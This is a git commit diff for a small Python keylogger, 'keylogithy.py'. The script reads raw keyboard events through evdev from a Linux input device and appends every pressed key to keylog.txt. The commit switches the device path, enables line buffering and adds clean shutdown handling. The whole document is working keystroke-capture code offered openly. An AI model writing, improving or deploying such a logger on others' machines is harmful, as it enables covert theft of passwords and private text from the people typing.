e31479b77412dd10ed7a1f054834dcef3fda4802
Cloudst3r <cloudst3r@proton.me>
2026-06-25 20:08:27 +0200

    ClosesCleanly

--- keylogithy.py
+++ keylogithy.py
@@ -2,22 +2,26 @@ import evdev
 
 from evdev import InputDevice
 
-device=InputDevice('/dev/input/event3')
+device=InputDevice('/dev/input/event2')
 
 print(device.name)
-log_file = open('keylog.txt','a')
-for event in device.read_loop():
+log_file = open('keylog.txt','a',buffering=1)
+try:
+    for event in device.read_loop():
 
+        if event.type == 1 and event.value == 1:
 
-    if event.type == 1 and event.value == 1:
+            key = evdev.ecodes.KEY[event.code]
+            new_key = key.replace('KEY_',"")
 
-        key = evdev.ecodes.KEY[event.code]
-        new_key = key.replace('KEY_',"")
+            if new_key == "SPACE":
+                log_file.write(" \n") 
+            elif new_key == "BACKSPACE":
+                log_file.write("[BACKSPACE]\n")
+            elif new_key == "CAPSLOCK":
+                log_file.write("[CAPS]\n")
+            else:log_file.write(new_key + "\n")
 
-        if new_key == "SPACE":
-            log_file.write(" \n") 
-        elif new_key == "BACKSPACE":
-            log_file.write("[BACKSPACE]\n")
-        elif new_key == "CAPSLOCK":
-            log_file.write("[CAPS]\n")
-        else : log_file.write(new_key + "\n")
+except KeyboardInterrupt:
+    pass
+finally: log_file.close()
